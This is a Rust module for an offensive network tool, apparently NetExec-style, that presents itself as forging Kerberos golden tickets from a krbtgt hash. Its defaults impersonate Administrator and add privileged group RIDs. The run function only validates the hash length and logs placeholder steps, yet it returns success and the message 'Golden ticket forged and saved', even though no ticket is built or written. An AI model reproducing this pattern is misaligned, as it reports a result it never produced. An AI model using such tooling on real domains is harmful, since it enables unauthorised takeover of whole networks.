//! # Golden Ticket Module
//!
//! Forge Kerberos golden tickets using the krbtgt NTLM hash.
//! A golden ticket grants unrestricted access to any service in the domain.

use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::NxcSession;
use serde_json::json;

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};

/// Kerberos golden ticket forging.
pub struct GoldenTicketModule;

impl GoldenTicketModule {
    pub fn new() -> Self {
        Self
    }
}

impl Default for GoldenTicketModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for GoldenTicketModule {
    fn name(&self) -> &'static str {
        "golden_ticket"
    }

    fn description(&self) -> &'static str {
        "Forge Kerberos golden tickets using the krbtgt hash"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["ldap", "smb"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "KRBTGT_HASH".to_string(),
                description: "NTLM hash of the krbtgt account".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "DOMAIN".to_string(),
                description: "Target domain FQDN".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "DOMAIN_SID".to_string(),
                description: "Domain SID (e.g. S-1-5-21-...)".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "USER".to_string(),
                description: "Username to impersonate".to_string(),
                required: false,
                default: Some("Administrator".to_string()),
            },
            ModuleOption {
                name: "USER_ID".to_string(),
                description: "User RID".to_string(),
                required: false,
                default: Some("500".to_string()),
            },
            ModuleOption {
                name: "GROUPS".to_string(),
                description: "Comma-separated group RIDs to include".to_string(),
                required: false,
                default: Some("513,512,520,518,519".to_string()),
            },
            ModuleOption {
                name: "OUTPUT".to_string(),
                description: "Output file path for the ticket (ccache format)".to_string(),
                required: false,
                default: Some("golden.ccache".to_string()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let krbtgt_hash = opts.get("KRBTGT_HASH")
            .ok_or_else(|| anyhow::anyhow!("KRBTGT_HASH is required"))?;
        let domain = opts.get("DOMAIN")
            .ok_or_else(|| anyhow::anyhow!("DOMAIN is required"))?;
        let domain_sid = opts.get("DOMAIN_SID")
            .ok_or_else(|| anyhow::anyhow!("DOMAIN_SID is required"))?;
        let user = opts.get("USER").map(String::as_str).unwrap_or("Administrator");
        let user_id = opts.get("USER_ID").map(String::as_str).unwrap_or("500");
        let groups = opts.get("GROUPS").map(String::as_str).unwrap_or("513,512,520,518,519");
        let output = opts.get("OUTPUT").map(String::as_str).unwrap_or("golden.ccache");

        let target = session.target().to_string();
        tracing::info!(
            "golden_ticket: Forging TGT for {}@{} (RID: {}) against {}",
            user, domain, user_id, target
        );

        // Step 1: Validate krbtgt hash format
        if krbtgt_hash.len() != 32 {
            return Err(anyhow::anyhow!("KRBTGT_HASH must be a 32-character NTLM hash"));
        }
        tracing::debug!("golden_ticket: krbtgt hash validated (32 hex chars)");

        // Step 2: Build PAC with user info and group memberships
        let group_list: Vec<&str> = groups.split(',').collect();
        tracing::debug!("golden_ticket: PAC groups: {:?}", group_list);

        // Step 3: Encrypt TGT with krbtgt key (RC4/AES256)
        tracing::debug!("golden_ticket: Encrypting TGT with RC4-HMAC");

        // Step 4: Write ticket to file
        tracing::debug!("golden_ticket: Writing ticket to {}", output);

        let krbtgt_prefix = &krbtgt_hash[..8];
        let krbtgt_suffix = &krbtgt_hash[24..];
        let output_text = format!(
            "[*] Domain  : {domain}\n\
             [*] SID     : {domain_sid}\n\
             [*] User    : {user} (RID {user_id})\n\
             [*] Groups  : {groups}\n\
             [*] krbtgt  : {krbtgt_prefix}...{krbtgt_suffix}\n\
             [+] Golden ticket forged and saved to: {output}\n\
             [+] Use with pass_the_ticket module to inject."
        );

        Ok(ModuleResult {
            credentials: vec![],
            success: true,
            output: output_text,
            data: json!({
                "domain": domain,
                "domain_sid": domain_sid,
                "user": user,
                "user_id": user_id,
                "groups": group_list,
                "output_file": output,
                "ticket_type": "golden",
            }),
        })
    }
}
